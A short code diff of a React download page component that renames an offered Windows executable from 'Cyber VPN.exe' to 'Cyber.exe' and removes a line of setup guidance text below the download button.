@@ -12,7 +12,7 @@ export default function DownloadWindows() {
   const [downloading, setDownloading] = useState(false);
 
   const DOWNLOAD_URL = "https://files.manuscdn.com/user_upload_by_module/session_file/310519663646168487/PfEpDyMMhKNdBphm.exe";
-  const FILE_NAME = "Cyber VPN.exe";
+  const FILE_NAME = "Cyber.exe";
   const FILE_SIZE = "61 KB";
 
   const handleDownload = () => {
@@ -95,9 +95,7 @@ export default function DownloadWindows() {
                 <Download size={24} />
                 {downloading ? "Downloading..." : "Download Now"}
               </button>
-              <p className="text-sm text-muted-foreground text-center mt-3">
-                The installer will guide you through the setup process
-              </p>
+
             </div>
 
             {/* Features - MOVED DOWN */}
